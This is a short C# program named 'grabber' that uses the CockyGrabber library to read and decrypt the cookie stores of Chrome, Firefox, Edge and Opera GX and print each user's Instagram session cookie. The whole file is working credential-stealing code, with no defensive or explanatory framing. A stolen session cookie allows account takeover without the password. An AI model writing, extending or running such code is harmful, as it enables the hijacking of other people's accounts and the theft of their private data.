using CockyGrabber;
using System;
namespace grabber
{
    class Program
    {
        static void Main(string[] args)
        {
            ChromeGrabber cg = new ChromeGrabber(); FirefoxGrabber fg = new FirefoxGrabber(); EdgeGrabber eg = new EdgeGrabber(); OperaGxGrabber og = new OperaGxGrabber();
            if (cg.CookiesExists())
            {
                foreach (var item in cg.GetCookiesByHostname(".instagram.com", cg.GetKey()))
                {
                    if (item.Name == ("sessionid"))
                    {
                        Console.WriteLine(item.Value + "\n");
                    }
                }
            }
            if (fg.CookiesExists())
            {
                foreach (var item in fg.GetCookiesByHostname(".instagram.com"))
                {
                    if (item.Name == (".c"))
                    {
                        Console.WriteLine(item.Value + "\n");
                    }
                }
            }
            if (eg.CookiesExists())
            {
                foreach (var item in eg.GetCookiesByHostname(".instagram.com", eg.GetKey()))
                {
                    if (item.Name == ("sessionid"))
                    {
                        Console.WriteLine(item.Value + "\n");
                    }
                    
                }
            }
            if (og.CookiesExists())
            {
                foreach (var item in og.GetCookiesByHostname(".instagram.com", og.GetKey()))
                {
                    if (item.Name == ("sessionid"))
                    {
                        Console.WriteLine(item.Value + "\n");
                    }
                }
            }
            Console.ReadKey();
        }
    }
}
